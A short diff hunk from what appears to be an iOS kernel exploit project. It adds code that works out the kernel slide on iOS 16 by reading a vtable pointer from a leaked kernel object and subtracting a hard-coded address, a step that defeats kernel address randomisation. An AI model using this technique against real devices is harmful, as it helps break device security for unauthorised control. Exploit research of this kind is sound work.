@@ -223,6 +223,14 @@ loop_break:
         krkw->krkw_maximum_id,
         batch_size
     );
+    
+    if (krkw->krkw_method_ops.kwrite) {
+        if (kfd->info.env.vid == 0 || kfd->info.env.vid == 1) {
+            // iOS 16, derive kernel base from vtable
+            volatile u64* object = (volatile u64*)(krkw->krkw_object_uaddr);
+            kfd->info.kernel.kernel_slide = (uint64_t)(object[0]) - 0xFFFFFFF006D859C0;
+        }
+    }
 
     print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);
 
